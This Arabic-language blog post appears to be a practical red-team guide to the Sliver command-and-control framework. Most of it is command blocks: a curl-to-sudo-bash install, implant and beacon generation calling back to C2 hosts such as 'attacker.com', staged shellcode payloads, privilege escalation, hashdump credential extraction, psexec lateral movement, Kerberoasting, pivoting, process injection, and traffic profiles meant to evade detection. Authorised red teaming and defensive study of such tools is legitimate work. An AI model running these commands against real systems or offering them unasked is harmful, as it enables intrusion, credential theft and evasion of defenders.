---
layout: blog
title: "دليل Sliver C2 للـ Red Teamers: إطار عمل حديث لعمليات الاختراق المتقدمة"
date: 2026-03-29T04:20:26Z
category: "أداة"
excerpt: "Sliver يمثل جيلًا جديدًا من أطر Command and Control المفتوحة المصدر. مكتوب بلغة Go، يقدم مرونة استثنائية في توليد Implants متعددة المنصات، مع تشفير قوي وتقنيات Evasion متقدمة. إذا كنت تبحث عن بديل عصري لـ Cobalt Strike، فهذا دليلك العملي."
read_time: 8
tags: ["Red Teaming", "Command and Control", "Post Exploitation", "Offensive Security"]
slug: "sliver-c2-guide"
---

## لماذا Sliver؟

في عالم Red Teaming المتطور، لم تعد الأدوات التقليدية كافية. Sliver ظهر كحل مفتوح المصدر يجمع بين قوة Cobalt Strike ومرونة Metasploit، مع ميزات حديثة مبنية من الأساس.

الأداة مكتوبة بالكامل بـ Go، مما يعني Implants صغيرة الحجم، سريعة التنفيذ، وقابلة للتجميع لأي منصة. دعم HTTP/HTTPS و DNS و mTLS و WireGuard مدمج بشكل أصلي، مع تشفير end-to-end لكل الاتصالات.

## البنية التقنية

Sliver يعتمد على معمارية Client-Server منفصلة. الـ Server يدير الـ Listeners و Implants، بينما الـ Client يوفر واجهة تفاعلية متعددة المستخدمين.

الـ Implants تأتي بنوعين رئيسيين:

**Sessions**: اتصالات تفاعلية طويلة الأمد، مثالية للتحكم المباشر. تستخدم persistent connections وتدعم multiplexing لتشغيل عدة أوامر بالتوازي.

**Beacons**: اتصالات asynchronous مع callback intervals قابلة للتخصيص. مثالية للعمليات الطويلة حيث الـ Stealth أولوية.

كل Implant يحوي crypto keys فريدة، ويدعم Dynamic loading للـ Extensions دون إعادة compilation.

## التنصيب والإعداد الأولي

التنصيب مباشر عبر script رسمي:

```bash
# Linux/macOS
curl https://sliver.sh/install|sudo bash

# تشغيل Server
sliver-server

# في terminal آخر، تشغيل Client
sliver-client
```

للإعداد المتعدد المستخدمين:

```bash
# توليد operator config
sliver-server operator --name redteamer --lhost 10.10.10.5

# نقل الملف للمستخدم
scp ~/.sliver-client/configs/redteamer_10.10.10.5.cfg user@host:

# على جهاز المستخدم
sliver-client import ./redteamer_10.10.10.5.cfg
```

هذه المعمارية تسمح بتوزيع العمليات عبر فريق كامل بشكل آمن.

## توليد Implants

قوة Sliver الحقيقية تظهر في مرونة توليد الـ Payloads:

```bash
# Session عبر HTTPS
generate --http 10.10.10.5:443 --save /tmp --os windows

# Beacon مع DNS C2
generate beacon --dns attacker.com --skip-symbols --os linux

# مع Obfuscation متقدم
generate --mtls 10.10.10.5:8888 --skip-symbols --debug --format shellcode
```

الـ `--skip-symbols` يزيل debugging symbols لتقليل الحجم. الـ `--format` يدعم exe, shared, service, shellcode - مرونة كاملة للـ delivery method.

للـ Staged payloads:

```bash
# توليد staging listener
stage-listener --url https://10.10.10.5:443 

# payload صغير يحمل الـ Implant الكامل
generate --http 10.10.10.5:443 --save /tmp/staged.exe
```

## العمليات التفاعلية

بعد الحصول على Session:

```bash
# عرض الجلسات النشطة
sessions

# الاتصال بجلسة
use [session-id]

# استكشاف أولي
info
getprivs
netstat
ps -T  # عرض العمليات مع تحديد injection candidates
```

لـ Privilege Escalation:

```bash
# UAC bypass (Windows)
getsystem

# أو استخدام تقنيات محددة
elevate -m named-pipe
```

للـ Lateral Movement:

```bash
# استخراج credentials
hashdump

# PSExec-like execution
psexec -d 192.168.1.10 -u admin -p password

# أو عبر WMI
execute-assembly /path/to/SharpWMI.exe
```

## Post-Exploitation المتقدم

Sliver يدعم تحميل Extensions ديناميكيًا:

```bash
# Armory: repository للـ Extensions
armory install rubeus

# استخدام Rubeus مباشرة
rubeus kerberoast /outfile:hashes.txt
```

للـ Pivoting:

```bash
# إنشاء SOCKS5 proxy
socks5 start

# Port forwarding
portfwd add --remote 3389 --bind 0.0.0.0:13389
```

Process Injection متعدد التقنيات:

```bash
# Spawn في process شرعي
spawn notepad.exe

# أو migrate لـ process موجود
migrate 1337
```

## الـ OPSEC و Evasion

Sliver مصمم مع الـ Stealth كأولوية:

- **In-Memory Execution**: الـ Implants تعمل بدون لمس القرص
- **Malleable Profiles**: تخصيص network traffic patterns
- **Anti-Forensics**: automatic cleanup للـ artifacts

لتخصيص الـ Traffic profile:

```bash
# استخدام HTTP C2 profile مخصص
generate --http example.com --http-c2-profile ./chrome.json
```

الـ Profiles تسمح بتقليد user-agents و headers محددة، مما يصعب Detection.

للبيئات الحساسة، استخدم DNS أو mTLS بدلاً من HTTP. WireGuard يوفر تشفيرًا إضافيًا وصعوبة في التتبع.

## الخلاصة العملية

Sliver ليس مجرد بديل مجاني لـ Cobalt Strike، بل أداة متطورة بحد ذاتها. المعمارية الحديثة، دعم المنصات المتعددة، والـ Extensibility تجعله خيارًا ممتازًا للـ Red Teams الحديثة.

التعلم curve معقول، والوثائق شاملة، والمجتمع نشط. إذا كنت تبني lab للـ Red Team operations، Sliver يستحق أن يكون في الـ Arsenal.
